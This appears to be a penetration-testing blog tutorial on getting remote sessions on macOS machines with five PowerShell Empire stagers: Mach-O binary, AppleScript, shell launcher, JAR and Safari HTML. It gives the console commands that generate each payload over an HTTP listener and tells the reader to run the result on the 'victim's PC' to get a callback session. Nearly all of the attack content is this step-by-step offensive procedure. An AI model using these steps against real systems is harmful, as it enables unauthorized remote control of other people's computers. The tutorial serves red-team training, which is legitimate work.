<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/" rel="category tag">PowerShell Empire</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Multiple Ways to Exploiting OSX using PowerShell Empire</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/multiple-ways-to-exploiting-osx-using-powershell-empire/" rel="bookmark"><time class="entry-date published" datetime="2019-03-18T16:57:51+00:00">March 18, 2019</time><time class="updated" datetime="2025-05-15T14:32:16+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we will learn multiple ways to <strong data-start="218" data-end="256">Exploit OSX with PowerShell Empire</strong>. There are various stages provided in Empire for this purpose, and we will cover a few of them here. The method to attack OSX is similar to that of Windows, making it a versatile approach for penetration testers. For a beginner’s guide to pen-testing OSX, click here.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><strong><span style="color: #000000;">osx/macho</span></strong></li>
<li><strong><span style="color: #000000;">osx/applescript</span></strong></li>
<li><strong><span style="color: #000000;">osx/launcher</span></strong></li>
<li><strong><span style="color: #000000;">osx/jar</span></strong></li>
<li><strong><span style="color: #000000;">osx/safari_launcher</span></strong></li>
</ul>
<h3><span style="color: #800000;">osx/macho</span></h3>
<p><span style="color: #000000;">The first stage we will use to attack is osx/macho. This stage will create a Mach-O file, which is an executable format of binaries in OS X. This file format developers created specifically for OS X. This file format informs the system about the order in which it reads code and data into memory. So, this stage is quite useful when it comes to attacking OS X.</span></p>
<p><span style="color: #000000;">The listener creation is the same as Windows; use the HTTP listener. Once the listener is created, execute the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager osx/macho
set Listener http
set OutFile shell.macho
execute</pre>
<p><span style="color: #000000;">As the shell.macho is executed in the victim’s PC, you will have your session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="//4.bp.blogspot.com/-kEc1p_xfEc0/XI_MTj-pLAI/AAAAAAAAdlo/qll6lDP7Mx08J63nfaUmL0B_2xaeGIcuACLcBGAs/s1600/1.png" alt="Exploiting OSX with PowerShell Empire" width="918" height="851"/></span></p>
<h3><span style="color: #800000;">osx/applescript</span></h3>
<p><span style="color: #000000;">The next stage we will use is OSX/AppleScript. This stage will create a code in an AppleScript, this script has an automated control over scriptable Mac applications as its dedicated script for Mac. Therefore, it’s an important stage for pen-testing Mac. To create the malicious Apple script, run the following set of commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager osx/applescript
set Listener http
execute</pre>
<p><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-mhnHqL5YRF4/XI_MTFFXk8I/AAAAAAAAdlg/6jcXXPifvUAldN40o801-SlCK99euKB6gCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Executing the above stager will create a code, run this code in the targeted system as it is shown in the following image :</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//3.bp.blogspot.com/-WarcRcWiK4k/XI_MTaEw6QI/AAAAAAAAdlk/PMnI5LkHxYQFOs5wWjx_2Eiy8OzHeWm6ACLcBGAs/s1600/3.1.png" alt="Exploiting OSX with PowerShell Empire" width="952" height="620"/></span></p>
<p><span style="color: #000000;">As soon as the code is executed in the victim’s PC, you will have your session as shown in the image :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-rj1pNDlVOXo/XI_MT9WlHUI/AAAAAAAAdls/6oZDrbckWzcOkVklYLz5EVcUVoSPlR2ngCLcBGAs/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">osx/launcher</span></h3>
<p><span style="color: #000000;">The next stager we will use is osx/launcher. This stager is most commonly used. To execute this stager, run the following commands :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager osx/launcher
execute</pre>
<p><span style="color: #000000;">copy this code and run it in the target system’s shell. Now as soon as the code is executed, you will have your session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="//1.bp.blogspot.com/-QO5hDLH5TMA/XI_MUUyq8rI/AAAAAAAAdlw/fS7YnGl_QF0tB09ju6qBfSyPdNwORibmgCLcBGAs/s1600/4.png" alt="Exploiting OSX with PowerShell Empire" width="939" height="726"/></span></p>
<h3><span style="color: #800000;">osx/jar</span></h3>
<p><span style="color: #000000;">The nest stager which we will use, is osx/jar. This stager creates a jar file which is a Java archive file. This file format serves compressed Java files that run as desired when extracted. This file extension specifically caters to Java files. This stager turns out to be a suitable one when it comes to attacking OS X. Use the following set of commands to execute the said stager :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager osx/jar
set Listener http
set OutFile out.jar
execute</pre>
<p><span style="color: #000000;">The stager will create a jar file as described above; the attacker will execute the said file in the victim’s system, and you will have your session as shown in the image :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-558_GC4AXyo/XI_MU1Y64XI/AAAAAAAAdl0/ZHB71vlXLysb2AhMWp_MQ0UCpTQxWz6PQCLcBGAs/s1600/5.png"/></span></p>
<h3><span style="color: #800000;">osx/safari_launcher</span></h3>
<p><span style="color: #000000;">The last stager we will use is osx/safari_launcher, this will generate an HTML script for safari. For this stager, run the following set of commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usestager osx/safari_launcher
set Listener http
execute</pre>
<p><span style="color: #000000;">Run the generated code in the safari of victim’s PC and so you shall have your session as shown in the image below :</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="//2.bp.blogspot.com/-O2F5cUM6G68/XI_MVHa4ZkI/AAAAAAAAdl4/RNBiNHt72fEzLx_d0ELBIMHn6xDQI8Y-ACLcBGAs/s1600/6.png" alt="Exploiting OSX with PowerShell Empire" width="933" height="943"/></span></p>
<p><span style="color: #000000;">To learn more about PowerShell. Follow this <strong><a href="https://www.hackingarticles.in/category/red-teaming/powershell-empire/">Link.</a></strong></span></p>
<p><span style="color: #000000;">So, these were five ways to attack or pentest OS X. They are pretty easy and convenient. Each of them is valid and up to date.</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sanjeet Kumar is an Information Security Analyst | Pentester | and Researcher. Contact <a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
